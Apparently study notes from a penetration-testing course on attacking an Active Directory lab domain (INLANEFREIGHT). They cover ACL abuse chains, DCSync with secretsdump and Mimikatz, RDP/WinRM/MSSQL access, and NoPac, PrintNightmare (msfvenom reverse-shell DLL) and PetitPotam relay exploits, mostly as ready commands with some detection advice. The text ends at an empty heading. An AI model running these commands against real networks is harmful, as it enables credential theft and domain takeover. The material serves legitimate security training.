  - **Discretionary Access Control List (DACL)**: Defines which principals are granted or denied access to an object. Absence of a DACL grants full access; an empty DACL denies all access.
  - **System Access Control Lists (SACL)**: Used to log access attempts to secured objects, helping with auditing.

### **Access Control Entries (ACEs)**
- **Types of ACEs**:
  - **Access Denied ACE**: Explicitly denies access.
  - **Access Allowed ACE**: Grants access.
  - **System Audit ACE**: Logs access attempts, regardless of whether access is granted or denied.
  
- **Components of an ACE**:
  1. **SID (Security Identifier)** of the user/group.
  2. **ACE Type**: Allow, Deny, or Audit.
  3. **Inheritance Flag**: Determines if child objects inherit the ACE.
  4. **Access Mask**: Defines specific rights granted.

### **Why ACEs Are Important**
- Attackers can exploit improperly configured ACEs to gain unauthorized access, escalate privileges, or establish persistence.
- ACEs are difficult to detect with vulnerability scanners and often go unchecked in large environments.
- **Example Vulnerable Permissions**:
  - `ForceChangePassword`, `GenericWrite`, `GenericAll`, `AddSelf`, etc., can all be exploited for lateral movement or privilege escalation.

### **Key ACEs for Exploitation**:
1. **ForceChangePassword**: Allows password reset without knowing the current password.
2. **GenericWrite**: Allows modification of non-protected attributes, like adding Service Principal Names (SPNs) for Kerberoasting or altering group membership.
3. **AddSelf**: Allows a user to add themselves to security groups.
4. **GenericAll**: Grants full control over an object, enabling modifications such as group membership changes or password resets. If this is granted over a computer object, it can lead to accessing the LAPS password.

### **ACL Attacks in the Wild**
ACL misconfigurations can be exploited for:
- **Lateral Movement**
- **Privilege Escalation**
- **Persistence**

## **Common Attack Scenarios**:
1. **Abusing Forgot Password Permissions**:
   - Help Desk users with permission to reset passwords could be exploited to reset privileged accounts.
   
2. **Abusing Group Membership Management**:
   - Gaining the ability to add users to privileged groups, like Domain Admins, can escalate privileges significantly.

3. **Excessive User Rights**:
   - Misconfigurations from software installations or legacy setups might give users excessive rights, which attackers can exploit.

#### **Tools for Enumeration and Exploitation**:
- **BloodHound**: Visualizes and enumerates ACL permissions to identify exploitable misconfigurations.
- **PowerView**: A PowerShell tool that helps enumerate and exploit AD ACLs.

---
# ACL enumeration 

### Overview
- **Purpose**: Enumerate ACLs using PowerView and visualize using BloodHound.
- **Tools**: PowerView, BloodHound, and PowerShell.

### Enumerating ACLs with PowerView
- **Challenge**: Digging through all results from PowerView can be time-consuming and inaccurate.

**Using Find-InterestingDomainAcl**
```powershell
PS C:\htb> Find-InterestingDomainAcl

# Example output:
# ObjectDN : DC=INLANEFREIGHT,DC=LOCAL
# AceQualifier : AccessAllowed
# ActiveDirectoryRights : ExtendedRight
# ObjectAceType : ab721a53-1e2f-11d0-9819-00aa0040529b
# AceFlags : ContainerInherit
# AceType : AccessAllowedObject
# InheritanceFlags : ContainerInherit
# SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-5189
# IdentityReferenceName : Exchange Windows Permissions
# IdentityReferenceDomain : INLANEFREIGHT.LOCAL
# IdentityReferenceDN : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL
# IdentityReferenceClass : group
```
- **Solution**: Perform targeted enumeration starting with a specific user.

**Get User SID**
```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
```

### Using Get-DomainObjectACL
- **Without ResolveGUIDs**
```powershell
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Example output:
# ObjectDN : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
# ObjectSID : S-1-5-21-3842939050-3880317879-2865463114-1176
# ActiveDirectoryRights : ExtendedRight
# ObjectAceFlags : ObjectAceTypePresent
# ObjectAceType : 00299570-246d-11d0-a768-00aa006e0529
```
- **Reverse Search & Mapping to a GUID Value**
```powershell
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl

# Example output:
# Name : User-Force-Change-Password
# DisplayName : Reset Password
# DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
# rightsGuid : 00299570-246d-11d0-a768-00aa006e0529
```

### Using the -ResolveGUIDs Flag
```powershell
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Example output:
# AceQualifier : AccessAllowed
# ObjectDN : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
# ActiveDirectoryRights : ExtendedRight
# ObjectAceType : User-Force-Change-Password
# ObjectSID : S-1-5-21-3842939050-3880317879-2865463114-1176
# InheritanceFlags : ContainerInherit
# BinaryLength : 56
# AceType : AccessAllowedObject
# ObjectAceFlags : ObjectAceTypePresent
```

### Understanding Tool Functions
- **Importance**: Knowing how tools work and alternative methods in case of failures.

### Using Get-Acl and Get-ADUser Cmdlets
- **Creating a List of Domain Users**
```powershell
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
- **Using a foreach Loop**
```powershell
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
}

# Example output:
# Path : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
# ActiveDirectoryRights : ExtendedRight
# InheritanceType : All
# ObjectType : 00299570-246d-11d0-a768-00aa006e0529
```
The loop goes through each user listed in ad_users.txt, retrieves their ACL information, and checks if the user wley has any rights over each of those user objects.
- **Understanding Rights**: Convert the GUID to a human-readable format.



## Further Enumeration of Rights Using `damundsen`

### ACL Enumeration for `damundsen`
```powershell
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

# Example output:
# AceType : AccessAllowed
# ObjectDN : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
# ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
# OpaqueLength : 0
# ObjectSID : S-1-5-21-3842939050-3880317879-2865463114-4022
# InheritanceFlags : ContainerInherit
```
- **Explanation**: `damundsen` has GenericWrite privileges over Help Desk Level 1.

### Investigating the Help Desk Level 1 Group with Get-DomainGroup
```powershell
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

# Example output:
# memberof
# --------
# CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```
- **Explanation**: Help Desk Level 1 is nested into Information Technology.

### Summary
- **Recap**:
  - Control over user `wley`.
  - Enumerated that `wley` can change the password for `damundsen`.
  - `damundsen` has GenericWrite over Help Desk Level 1.
  - Help Desk Level 1 is nested into Information Technology.
  - Information Technology group has GenericAll over `adunn`.
  - `adunn` has DS-Replication-Get-Changes rights.


### Investigating the Information Technology Group
```powershell
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

# Example output:
# AceType : AccessAllowed
# ObjectDN : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
# ActiveDirectoryRights : GenericAll
# OpaqueLength : 0
# ObjectSID : S-1-5-21-3842939050-3880317879-2865463114-1164
# InheritanceFlags : ContainerInherit
# BinaryLength : 36
# IsInherited : False
# IsCallback : False
```
- **Explanation**: Information Technology group has GenericAll over `adunn`.

### Looking for Interesting Access for `adunn`
```powershell
PS C:\htb> $adunnsid = Convert-NameToSid adunn
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

# Example output:
# AceQualifier : AccessAllowed
# ObjectDN : DC=INLANEFREIGHT,DC=LOCAL
# ActiveDirectoryRights : ExtendedRight
# ObjectAceType : DS-Replication-Get-Changes-In-Filtered-Set
# ObjectSID : S-1-5-21-3842939050-3880317879-2865463114
# AceType : AccessAllowedObject
# AceQualifier : AccessAllowed
# ObjectDN : DC=INLANEFREIGHT,DC=LOCAL
# ActiveDirectoryRights : ExtendedRight
# ObjectAceType : DS-Replication-Get-Changes
# ObjectSID : S-1-5-21-3842939050-3880317879-2865463114
```
- **Explanation**: `adunn` has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This allows leveraging for a DCSync attack.

### Enumerating ACLs with BloodHound
- **Context**: Using BloodHound to simplify and visualize the attack path.

**Using BloodHound for Enumeration:**
1. **Upload Data**: Use SharpHound ingestor data with BloodHound.
2. **Set Starting Node**: Set user `wley` as the starting node.
3. **Node Info Tab**: Scroll to Outbound Control Rights.
4. **First Degree Object Control**: Click on the number next to it to see initial rights (e.g., ForceChangePassword over `damundsen`).

**Viewing Node Info through BloodHound**
- **Help Menu**:
  - Provides info on specific rights.
  - Tools and commands for attacks.
  - OpSec considerations.
  - External references.

**Investigating ForceChangePassword Further**
- **Transitive Object Control**: Click to see the entire path.

**Viewing Potential Attack Paths through BloodHound**
- **Pre-built Queries**: Use BloodHound to confirm `adunn` has DCSync rights.
![image](https://github.com/user-attachments/assets/59e2bd06-2597-484a-b39e-336802f63637)


**Viewing Pre-Build queries through BloodHound**
![image](https://github.com/user-attachments/assets/d1bd3858-f041-41ba-b18a-af3864ef8124)

---

# ACL Abuse Tactics

## Overview
This document outlines a step-by-step attack chain to escalate privileges in an Active Directory (AD) environment using Access Control List (ACL) abuse tactics. These techniques demonstrate how attackers leverage ACL misconfigurations to gain unauthorized access and escalate privileges.

## Attack Chain Steps

### Initial Setup
1. **Compromised User (wley):**  
   - NTLMv2 hash retrieved using Responder.  
   - Hash cracked offline with Hashcat to obtain the cleartext password.  
   - Goal: Escalate to the `adunn` user capable of performing a **DCSync attack**.

2. **Objective:**  
   - Use `wley` to change the password for `damundsen`.  
   - Leverage `damundsen`’s permissions to gain access to critical groups.  
   - Exploit nested group membership and **GenericAll** rights to control the `adunn` user.



### Step 1: Change `damundsen` Password
1. Authenticate as `wley`:
   ```powershell
   $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
   $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
   ```

2. Set a new password for `damundsen`:
   ```powershell
   $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
   Import-Module .\PowerView.ps1
   Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
   ```



### Step 2: Add `damundsen` to Help Desk Level 1 Group
1. Authenticate as `damundsen`:
   ```powershell
   $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
   $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
   ```

2. Add to the group:
   ```powershell
   Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
   ```



### Step 3: Exploit Nested Group Membership
- Use inherited permissions via **GenericAll** to modify the `adunn` account.

1. Create a fake SPN for `adunn`:
   ```powershell
   Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
   ```

2. Perform Kerberoasting to retrieve the TGS hash:
   ```powershell
   .\Rubeus.exe kerberoast /user:adunn /nowrap
   ```

3. Crack the hash offline using Hashcat to obtain `adunn`’s password.



## Cleanup Steps
1. **Remove Fake SPN:**
   ```powershell
   Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
   ```

2. **Remove `damundsen` from Group:**
   ```powershell
   Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
   ```

3. **Reset `damundsen` Password:**  
   Ensure `damundsen`’s password is restored to its original value or reset by the client.


## Detection and Remediation

### Detection
1. **Monitor ACL Changes:**  
   Enable **Advanced Security Audit Policy** and monitor **Event ID 5136** (Directory Object Modified).

   Example of identifying changes using SDDL:
   ```powershell
   ConvertFrom-SddlString "$STRING" | Select -ExpandProperty DiscretionaryAcl
   ```

2. **Group Membership Monitoring:**  
   Regularly audit and alert on changes to high-impact groups.

### Remediation
1. **Regular AD Audits:**  
   Use tools like **BloodHound** to identify and remove dangerous ACLs.

2. **Limit Permissions:**  
   Remove unnecessary permissions and regularly review ACL configurations.

3. **Deploy Monitoring Tools:**  
   Combine AD monitoring tools with built-in Windows security features to detect attacks early.



## Key Takeaways
- **Understanding Attack Chains:** ACL abuse can escalate privileges quickly in poorly secured domains.
- **Proactive Monitoring:** Regular auditing and monitoring are essential to prevent ACL abuse.
- **Comprehensive Cleanup:** Document all changes during assessments and ensure no residual changes remain.

---

# DCSync 

## **What is DCSync?**
- **DCSync** is an attack technique to extract password hashes and other secrets from Active Directory (AD).
- Leverages the **Directory Replication Service Remote Protocol** (DRSR) to request replication of AD secrets (e.g., NTLM hashes, Kerberos keys).
- **Required Permissions**: 
  - **Replicating Directory Changes**
  - **Replicating Directory Changes All**
- **Typical Privileged Accounts**:
  - Domain Admins
  - Enterprise Admins
  - Delegated accounts with DCSync rights.



## **Core Mechanics**
1. **Protocol Misuse**:
   - Exploits the replication process where Domain Controllers (DCs) share data for synchronization.
2. **Outcome**:
   - Steals NTLM hashes, Kerberos keys, and optionally cleartext passwords if reversible encryption is enabled.


## **Detecting DCSync Rights**

### **Step 1: Verify Group Membership**
- Check if the user (`adunn`) belongs to privileged groups:
  ```powershell
  Get-DomainUser -Identity adunn | select samaccountname, objectsid, memberof, useraccountcontrol | fl
  ```
- Example output:
  - Normal account with additional permissions:
    - `DONT_EXPIRE_PASSWORD`
    - Membership in security groups with extended rights.

### **Step 2: Check ACLs for Replication Rights**
- Extract user's **Security Identifier (SID)**:
  ```powershell
  $sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
  ```
- Use `Get-ObjectAcl` to verify replication permissions:
  ```powershell
  Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') } | ?{ $_.SecurityIdentifier -match $sid }
  ```
- Example output includes:
  - `DS-Replication-Get-Changes`
  - `DS-Replication-Get-Changes-All`



## **Performing DCSync Attacks**

### **Using Impacket (Linux Host)**
1. **Run secretsdump.py**:
   ```bash
   secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
   ```
2. **Options**:
   - `-just-dc`: Extract NTLM hashes and Kerberos keys.
   - `-just-dc-user <USERNAME>`: Extract for a specific user.
   - `-history`: Dump password history.
   - `-pwd-last-set`: Check password last change timestamps.

3. **Output Files**:
   - `.ntds`: NTLM hashes.
   - `.ntds.kerberos`: Kerberos keys.
   - `.ntds.cleartext`: Cleartext passwords (if reversible encryption enabled).



### **Using Mimikatz (Windows Host)**

#### **Step 1: Run PowerShell as the DCSync Privileged User**
1. Use the **runas.exe** command to start a session as the user with DCSync privileges:
   ```cmd
   runas /netonly /user:INLANEFREIGHT\adunn powershell
   ```
2. Enter the password for `INLANEFREIGHT\adunn` when prompted.

#### **Step 2: Perform the Attack in the New Session**
1. Launch Mimikatz:
   ```powershell
   .\mimikatz.exe
   ```
2. Elevate privileges in Mimikatz:
   ```mimikatz
   privilege::debug
   ```
3. Execute the DCSync attack:
   ```mimikatz
   lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
   ```
4. **Example Output**:
   - NTLM Hash: `88ad09182de639ccc6579eb0849751cf`
   - Supplemental credentials like Kerberos keys.



## **Special Cases: Reversible Encryption**
- **Reversible encryption** stores passwords in RC4-encrypted form.
- Accounts with reversible encryption enabled can be enumerated:
  ```powershell
  Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
  ```
- Example Account:
  - `proxyagent` with `ENCRYPTED_TEXT_PWD_ALLOWED`.
- The password can be decrypted using tools like `secretsdump.py`.

---

# Privileged Access 

## **Overview**
In Windows domains, once an initial foothold is gained, the next steps involve **lateral movement** or **privilege escalation** to compromise the domain or achieve assessment objectives. This often requires identifying and exploiting remote access mechanisms or administrative privileges. Key strategies include:

1. **Remote Desktop Protocol (RDP)**:
   - GUI-based remote access to target systems for further attacks or reconnaissance.
2. **PowerShell Remoting (WinRM)**:
   - Enables command-line remote access to execute scripts or commands on target systems.
3. **MSSQL Server Exploitation**:
   - Leverages SQL server administrative privileges for command execution and potential privilege escalation.

### **Common Scenarios for Privileged Access**
- Compromising a low-privileged account with remote access rights (e.g., RDP, WinRM).
- Exploiting SQL server misconfigurations or sysadmin accounts.
- Pivoting through compromised hosts to escalate privileges.

Tools such as **BloodHound**, **PowerView**, and **PowerUpSQL** can identify and exploit these access opportunities effectively.


## **Remote Desktop Protocol (RDP)**

### **Purpose**
- Provides GUI-based access to a target host, enabling manual interaction and reconnaissance.
- Useful for:
  - Launching further attacks.
  - Privilege escalation.
  - Collecting sensitive data or credentials.

### **Enumeration**
#### Using PowerView
- Check members of the **Remote Desktop Users** group on a target host:
  ```powershell
  Get-NetLocalGroupMember -ComputerName <TargetHost> -GroupName "Remote Desktop Users"
  ```
  **Example**:
  ```powershell
  Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
  ```
  **Output**:
  ```
  ComputerName : ACADEMY-EA-MS01
  GroupName    : Remote Desktop Users
  MemberName   : INLANEFREIGHT\Domain Users
  ```
  **Analysis**:
  - All domain users can RDP to `ACADEMY-EA-MS01`. This is common on heavily used hosts such as RDS servers or jump hosts.

#### Using BloodHound
- Check if **Domain Users** or specific compromised accounts have RDP access:
  - Use pre-built queries:
    - **Find Workstations where Domain Users can RDP**
    - **Find Servers where Domain Users can RDP**

### **Exploitation**
- **Tools for RDP**:
  - **Linux**: Use `xfreerdp` or `Remmina`.
  - **Windows**: Use `mstsc.exe`.

**Example**:
- Establish an RDP session:
  ```bash
  xfreerdp /u:<User> /p:<Password> /v:<TargetHost>
  ```



## **PowerShell Remoting (WinRM)**

### **Purpose**
- Facilitates command-line remote access to execute commands, scripts, or manage target systems.
- Especially valuable for:
  - Lateral movement.
  - Collecting sensitive data.
  - Privilege escalation.

### **Enumeration**
#### Using PowerView
- Enumerate members of the **Remote Management Users** group:
  ```powershell
  Get-NetLocalGroupMember -ComputerName <TargetHost> -GroupName "Remote Management Users"
  ```
  **Example**:
  ```powershell
  Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
  ```
  **Output**:
  ```
  ComputerName : ACADEMY-EA-MS01
  GroupName    : Remote Management Users
  MemberName   : INLANEFREIGHT\forend
  ```

#### Using BloodHound
- Search for **WinRM rights**:
  - Use the Cypher query:
    ```cypher
    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
    MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
    RETURN p2
    ```

### **Exploitation**
1. **From Windows**:
   - Establish a remote PowerShell session:
     ```powershell
     $password = ConvertTo-SecureString "Password123" -AsPlainText -Force
     $cred = New-Object System.Management.Automation.PSCredential ("Domain\User", $password)
     Enter-PSSession -ComputerName <TargetHost> -Credential $cred
     ```
   - Use commands interactively and exit with:
     ```powershell
     Exit-PSSession
     ```

2. **From Linux**:
   - Install **evil-winrm**:
     ```bash
     gem install evil-winrm
     ```
   - Establish a WinRM session:
     ```bash
     evil-winrm -i <IP> -u <User> -p <Password>
     ```
   **Example**:
   ```bash
   evil-winrm -i 10.129.201.234 -u forend
   ```



## **MSSQL Server Exploitation**

### **Purpose**
- SQL servers often host sensitive data or provide admin-level access that can be exploited for privilege escalation.

### **Enumeration**
#### Using PowerUpSQL
- Import the module and enumerate SQL instances:
  ```powershell
  Import-Module .\PowerUpSQL.ps1
  Get-SQLInstanceDomain
  ```
  **Example Output**:
  ```
  ComputerName: ACADEMY-EA-DB01
  Instance: ACADEMY-EA-DB01,1433
  DomainAccount: damundsen
  ```

#### Using BloodHound
- Search for users with **SQL Admin rights**:
  - Use the Cypher query:
    ```cypher
    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
    MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) 
    RETURN p2
    ```

### **Exploitation**
1. **From Windows**:
   - Authenticate and run SQL queries:
     ```powershell
     Get-SQLQuery -Verbose -Instance "<Instance>" -username "<Username>" -password "<Password>" -query 'SELECT @@VERSION'
     ```
   - Enable `xp_cmdshell` for command execution:
     ```sql
     enable_xp_cmdshell
     xp_cmdshell whoami /priv
     ```

2. **From Linux**:
   - Use **mssqlclient.py** from the Impacket toolkit:
     ```bash
     mssqlclient.py INLANEFREIGHT/USERNAME@<IP> -windows-auth
     ```

---

# Bleeding Edge Vulnerabilities

#### **Overview**
Bleeding-edge vulnerabilities represent newly discovered weaknesses in systems that attackers can exploit before organizations have fully implemented patches or defensive measures. These vulnerabilities often provide an edge in **penetration testing** by leveraging recent exploits that may not yet be widely known or mitigated. While powerful, these techniques require a solid understanding of the potential risks, as they can lead to service disruptions if misused.

#### **Key Considerations:**
1. **Organizational Challenges:**
   - Many organizations delay patch rollouts due to compatibility concerns, lack of resources, or operational constraints. This delay creates opportunities for attackers.
   - Security practitioners must understand these vulnerabilities thoroughly before testing them in production environments.

2. **Risks of Exploitation:**
   - While some techniques (e.g., NoPac, PrintNightmare) are considered less destructive than older vulnerabilities like **Zerologon** or **DCShadow**, they still carry risks.
   - Examples include potential service crashes (e.g., Print Spooler issues in PrintNightmare) or triggering security alerts.

3. **Lab Environment Testing:**
   - It is essential to test these techniques in controlled environments to understand their implications.
   - Use tools like **Rubeus**, **Mimikatz**, and **Impacket** to simulate attacks and develop a solid methodology.

4. **Professionalism in Assessments:**
   - Document steps thoroughly.
   - Communicate findings and risks clearly with stakeholders.
   - Respect organizational policies and avoid causing unintended disruptions.



## **Vulnerabilities Covered**

#### **1. NoPac (SamAccountName Spoofing)**
**Key Details:**
- **Vulnerability:** A combination of two CVEs:
  - **CVE-2021-42278:** A bypass vulnerability in the **Security Account Manager (SAM)**.
  - **CVE-2021-42287:** A flaw in the **Kerberos Privilege Attribute Certificate (PAC)**.
- **Discovered:** Late 2021.
- **Impact:** Enables escalation from a standard domain user to **Domain Admin** privileges in a single command.
- **Mechanism:** Exploits the ability of domain users to rename machine accounts to impersonate a **Domain Controller (DC)**, manipulating Kerberos ticket issuance.

**Attack Flow:**
1. By default, domain users can add up to 10 machines to the domain.
2. The attacker renames a machine account to match a DC’s `SamAccountName`.
3. When Kerberos issues a **Ticket Granting Service (TGS)**, it matches the renamed machine account to the DC and grants elevated privileges.
4. This allows the attacker to impersonate the DC, execute commands as **NT AUTHORITY\SYSTEM**, or perform **DCSync** attacks to extract sensitive credentials.

**Steps to Exploit:**
1. **Preparation:**
   - Clone and install required tools:
     ```bash
     git clone https://github.com/SecureAuthCorp/impacket.git
     python setup.py install
     git clone https://github.com/Ridter/noPac.git
     ```
   
2. **Scan for Vulnerability:**
   - Use `scanner.py` to check if the target is vulnerable:
     ```bash
     python3 scanner.py domain/username:password -dc-ip <DC_IP> -use-ldap
     ```
   - Indicators of vulnerability:
     - `ms-DS-MachineAccountQuota` is > 0 (default is 10).
     - TGT is successfully obtained.

3. **Exploit:**
   - Gain a SYSTEM shell:
     ```bash
     python3 noPac.py domain/username:password -dc-ip <DC_IP> -dc-host <DC_HOST> -shell --impersonate administrator -use-ldap
     ```
   - Save and use TGT tickets for additional attacks:
     - Example: **DCSync attack**:
       ```bash
       python3 noPac.py domain/username:password -dc-ip <DC_IP> -dc-host <DC_HOST> --impersonate administrator -dump
       ```

**Post-Exploitation Considerations:**
- Clean up artifacts like `.ccache` files to avoid leaving traces.
- Review saved tickets for extended attacks like Pass-the-Ticket.

**Defensive Measures:**
- Set `ms-DS-MachineAccountQuota = 0` to prevent users from adding machine accounts.
- Regularly audit and monitor Kerberos ticket activity for anomalies.



#### **2. PrintNightmare**
**Key Details:**
- **Vulnerability:** Exploits flaws in the **Print Spooler service**:
  - **CVE-2021-34527**: Remote code execution.
  - **CVE-2021-1675**: Privilege escalation.
- **Discovered:** 2021.
- **Impact:** Provides an attacker with **SYSTEM-level privileges** by uploading and executing malicious DLLs remotely.
- **Mechanism:** Uses vulnerable **MS-RPRN** and **MS-PAR** protocols to manipulate the Print Spooler.

**Attack Flow:**
1. **Check MS-RPRN Availability:**
   - Use `rpcdump.py` to enumerate exposed protocols:
     ```bash
     rpcdump.py @<target_IP> | egrep 'MS-RPRN|MS-PAR'
     ```
   
2. **Prepare Payload:**
   - Generate a malicious DLL using `msfvenom`:
     ```bash
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll > payload.dll
     ```

3. **Host Payload:**
   - Use `smbserver.py` to host the payload:
     ```bash
     smbserver.py -smb2support <ShareName> /path/to/payload.dll
     ```

4. **Execute Exploit:**
   - Run the exploit script against the target:
     ```bash
     python3 CVE-2021-1675.py domain/username:password@<target_IP> '\\<host_IP>\<ShareName>\payload.dll'
     ```
   - If successful, the target will execute the payload and call back to the attacker's handler, granting a SYSTEM shell.

**Post-Exploitation Considerations:**
- Clean up payloads and temporary files.
- Use `Meterpreter` to extend post-exploitation activities.

**Defensive Measures:**
- Disable the Print Spooler service on non-essential systems.
- Apply the latest patches from Microsoft to secure the Print Spooler.


### PetitPotam (MS-EFSRPC)
 **Overview**

PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that abuses **Microsoft Encrypting File System Remote Protocol (MS-EFSRPC)** to coerce a **Domain Controller (DC)** to authenticate against a malicious host. By relaying this authentication (using NTLM), attackers can exploit environments with **Active Directory Certificate Services (AD CS)** enabled, potentially gaining full domain control.


#### **PetitPotam Attack Flow**

1. **Core Concept:**
   - Coerces the DC to authenticate to an attacker's host using **LSARPC** (via port 445).
   - Relays the NTLM authentication to a CA Web Enrollment service.
   - Captures a certificate that can be used to request a **Ticket-Granting Ticket (TGT)** for the DC.
   - Uses the TGT to perform privileged operations, such as **DCSync**.

2. **Tools Required:**
   - **PetitPotam.py** or its equivalents (Mimikatz, PowerShell scripts).
   - **Impacket tools**: ntlmrelayx.py, secretsdump.py.
   - **PKINITtools**: gettgtpkinit.py, getnthash.py.
   - **Rubeus** (optional, for Windows-based attacks).



#### **Exploitation Methods**



##### **1. Using PetitPotam.py**
1. **Start NTLM Relaying:**
   - Run ntlmrelayx.py on the attack host to target the CA Web Enrollment URL:
     ```bash
     sudo ntlmrelayx.py -debug -smb2support --target http://<CA_Host>/certsrv/certfnsh.asp --adcs --template DomainController
     ```

2. **Trigger Authentication with PetitPotam:**
   - Use PetitPotam to coerce the DC to authenticate to the attacker's NTLM relay server:
     ```bash
     python3 PetitPotam.py <attack_host_IP> <DC_IP>
     ```



##### **2. Using Mimikatz**
Mimikatz includes the ability to coerce DC authentication using its **EFS module**.

1. **Command to Coerce Authentication:**
   Run the following command from Mimikatz:
   ```bash
   misc::efs /server:<DC_IP> /connect:<attack_host_IP>
   ```

   - **/server:** IP or hostname of the Domain Controller.
   - **/connect:** IP or hostname of the attacker’s NTLM relay server.

2. **Expected Result:**
   - Mimikatz forces the DC to connect to the attacker's relay server.
   - If ntlmrelayx.py is running on the attack host, it captures the authentication and requests a certificate.



##### **3. Using PowerShell**
Alternatively, a PowerShell implementation of PetitPotam (`Invoke-PetitPotam.ps1`) can also be used to achieve the same result.

1. **Trigger Authentication:**
   - From a PowerShell session:
     ```powershell
     Invoke-PetitPotam -Target <DC_IP> -AttackerIP <attack_host_IP>
     ```



##### **Post-Authentication Steps**

1. **Captured Certificate:**
   - If successful, ntlmrelayx.py captures a Base64-encoded certificate for the targeted DC.

2. **Request a TGT Using PKINIT:**
   - Use gettgtpkinit.py to request a TGT with the captured certificate:
     ```bash
     python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<DC_machine_account>$ -pfx-base64 <Base64_Certificate> <output_file>
     ```

3. **Set the TGT for Authentication:**
   - Export the `.ccache` file to the Kerberos environment:
     ```bash
     export KRB5CCNAME=dc01.ccache
     ```

4. **Perform a DCSync Attack:**
   - Use secretsdump.py to retrieve sensitive credentials:
     ```bash
     secretsdump.py -just-dc-user <domain>/administrator -k -no-pass <DC_machine_account>@<DC_FQDN>
     ```


##### **Advanced Usage: Mimikatz for DCSync**

Once authentication is coerced and a valid Kerberos ticket is available, Mimikatz can be used to perform a **DCSync attack**.

1. **Start Mimikatz:**
   - Run Mimikatz on a privileged Windows machine:
     ```bash
     mimikatz.exe
     ```

2. **Perform DCSync:**
   - Dump the **KRBTGT** account hash or other sensitive credentials:
     ```bash
     lsadump::dcsync /user:<domain>\<target_user>
     ```

   Example:
   ```bash
   lsadump::dcsync /user:inlanefreight\krbtgt
   ```

3. **Expected Output:**
   - NTLM hash, LM hash, and Kerberos keys for the target user are retrieved:
     ```
     Credentials:
       Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
     ```



##### **Alternate Routes for Exploitation**

